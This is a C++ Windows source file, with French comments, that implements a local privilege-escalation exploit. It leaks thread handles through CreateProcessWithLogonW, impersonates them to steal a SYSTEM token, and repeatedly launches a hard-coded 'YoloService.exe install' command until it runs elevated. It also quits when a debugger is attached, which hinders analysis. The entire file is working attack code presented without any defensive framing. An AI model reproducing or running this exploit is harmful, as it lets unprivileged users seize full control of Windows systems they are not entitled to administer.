// PrivilegeElevation.cpp : définit le point d'entrée pour l'application console.
//

#include "stdafx.h"



#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <map>

#define MAX_PROCESSES 1000

LPWSTR yoloDllPathReg = L"C:\\Users\\admin\\Documents\\Dll\\YoloDll\\Release\\YoloService.exe install";

HANDLE GetThreadHandle()
{
	PROCESS_INFORMATION procInfo = {};
	STARTUPINFO startInfo = {};
	startInfo.cb = sizeof(startInfo);

	startInfo.hStdInput = GetCurrentThread();
	startInfo.hStdOutput = GetCurrentThread();
	startInfo.hStdError = GetCurrentThread();
	startInfo.dwFlags = STARTF_USESTDHANDLES;

	if (CreateProcessWithLogonW(L"test", L"test", L"test",
		LOGON_NETCREDENTIALS_ONLY,
		nullptr, L"cmd.exe", CREATE_SUSPENDED,
		nullptr, nullptr, &startInfo, &procInfo))
	{
		HANDLE hThread;
		BOOL res = DuplicateHandle(procInfo.hProcess, (HANDLE)0x4,
			GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
		DWORD dwLastError = GetLastError();
		TerminateProcess(procInfo.hProcess, 1);
		CloseHandle(procInfo.hProcess);
		CloseHandle(procInfo.hThread);
		if (!res)
		{
			exit(1);
		}

		return hThread;
	}
	else
	{
		exit(1);
	}
}

typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle,
	HANDLE ThreadToImpersonate,
	PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

HANDLE GetSystemToken(HANDLE hThread)
{
	SuspendThread(hThread);

	NtImpersonateThread* fNtImpersonateThread =
		(NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"),
		"NtImpersonateThread");
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	SetThreadToken(&hThread, nullptr);
	NTSTATUS status = fNtImpersonateThread(hThread, hThread, &sqos);
	if (status != 0)
	{
		ResumeThread(hThread);
		exit(1);
	}

	HANDLE hToken;
	if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
		FALSE, &hToken))
	{
		ResumeThread(hThread);
		exit(1);
	}

	ResumeThread(hThread);

	return hToken;
}

struct ThreadArg
{
	HANDLE hThread;
	HANDLE hToken;
};

DWORD CALLBACK SetTokenThread(LPVOID lpArg)
{
	ThreadArg* arg = (ThreadArg*)lpArg;
	while (true)
	{
		if (!SetThreadToken(&arg->hThread, arg->hToken))
		{
			break;
		}
	}
	return 0;
}

int main()
{
	std::map<DWORD, HANDLE> thread_handles;

	// Si le programme est en train d'être debuggé on s'arrête
	if (IsDebuggerPresent()) return 1;

	for (int i = 0; i < MAX_PROCESSES; ++i) {
		HANDLE hThread = GetThreadHandle();
		DWORD dwTid = GetThreadId(hThread);
		if (!dwTid)
		{
			exit(1);
		}

		if (thread_handles.find(dwTid) == thread_handles.end())
		{
			thread_handles[dwTid] = hThread;
		}
		else
		{
			CloseHandle(hThread);
		}
	}

	if (thread_handles.size() > 0)
	{
		HANDLE hToken = GetSystemToken(thread_handles.begin()->second);

		for (const auto& pair : thread_handles)
		{
			ThreadArg* arg = new ThreadArg;

			arg->hThread = pair.second;
			DuplicateToken(hToken, SecurityImpersonation, &arg->hToken);

			CreateThread(nullptr, 0, SetTokenThread, arg, 0, nullptr);
		}

		while (true)
		{
			PROCESS_INFORMATION procInfo = {};
			STARTUPINFO startInfo = {};
			startInfo.cb = sizeof(startInfo);

			if (CreateProcessWithLogonW(L"test", L"test", L"test",
				LOGON_NETCREDENTIALS_ONLY, nullptr,
				yoloDllPathReg, CREATE_SUSPENDED, nullptr, nullptr,
				&startInfo, &procInfo))
			{
				HANDLE hProcessToken;
				// If we can't get process token good chance it's a system process.
				if (!OpenProcessToken(procInfo.hProcess, MAXIMUM_ALLOWED,
					&hProcessToken))
				{
					ResumeThread(procInfo.hThread);
					break;
				}
				// Just to be sure let's check the process token isn't elevated.
				TOKEN_ELEVATION elevation;
				DWORD dwSize = 0;
				if (!GetTokenInformation(hProcessToken, TokenElevation,
					&elevation, sizeof(elevation), &dwSize))
				{
					ResumeThread(procInfo.hThread);
					break;
				}

				if (elevation.TokenIsElevated)
				{
					break;
				}

				TerminateProcess(procInfo.hProcess, 1);
				CloseHandle(procInfo.hProcess);
				CloseHandle(procInfo.hThread);
			}
		}
	}

	return 0;
}


